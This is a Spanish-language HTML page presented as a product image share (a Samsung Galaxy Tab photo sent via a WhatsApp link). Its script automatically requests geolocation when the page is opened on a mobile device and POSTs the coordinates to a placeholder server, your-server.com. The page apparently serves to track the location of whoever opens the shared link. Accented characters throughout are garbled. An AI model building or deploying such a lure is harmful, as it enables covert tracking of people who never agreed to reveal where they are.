<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Enviar Imagen y Obtener Ubicaci贸n</title>
</head>
<body>
    <h2>Enviar Imagen al Tel茅fono</h2>
    
    <!-- Imagen que se enviar谩 al tel茅fono -->
    <h3>Imagen del Producto:</h3>
    <img id="productImage" src="Samsung-Galaxy-Tab-S10-2.jpg" alt="Producto" width="300">

    <!-- Bot贸n para enviar imagen -->
    <p>
        <a id="sendImage" href="#" target="_blank"> Enviar imagen al tel茅fono</a>
    </p>

    <!-- Espacio para mostrar la ubicaci贸n devuelta -->
    <h2>Ubicaci贸n del Tel茅fono:</h2>
    <p id="location">Esperando ubicaci贸n...</p>
    <a id="mapsLink" href="#" target="_blank" style="display: none;"> Ver en Google Maps</a>

    <script>
        // URL de la imagen p煤blica
        const imageUrl = "https://raw.githubusercontent.com/clentebanks/ubicacion/refs/heads/main/Samsung-Galaxy-Tab-S10-2.jpg"; // Cambia esto por la URL real de tu imagen

        // Enviar la imagen al tel茅fono (ejemplo con WhatsApp)
        document.getElementById("sendImage").href = `https://api.whatsapp.com/send?text=Mira esta imagen: ${imageUrl}`;

        // Funci贸n para obtener la ubicaci贸n cuando el usuario abre la p谩gina en su tel茅fono
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Mostrar la ubicaci贸n en la p谩gina
                    document.getElementById("location").textContent = `Latitud: ${latitude}, Longitud: ${longitude}`;

                    // Crear un enlace a Google Maps
                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    const linkElement = document.getElementById("mapsLink");
                    linkElement.href = mapsLink;
                    linkElement.style.display = "block";

                    // Opcional: Enviar la ubicaci贸n a un servidor
                    fetch('https://your-server.com/sendLocation', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude, longitude })
                    });

                    alert(`Ubicaci贸n enviada: Latitud: ${latitude}, Longitud: ${longitude}`);
                });
            } else {
                alert("Geolocalizaci贸n no soportada en este dispositivo.");
            }
        }

        // Verificar si la p谩gina se abre en un tel茅fono (para enviar la ubicaci贸n)
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            sendLocation();
        }
    </script>
</body>
</html>
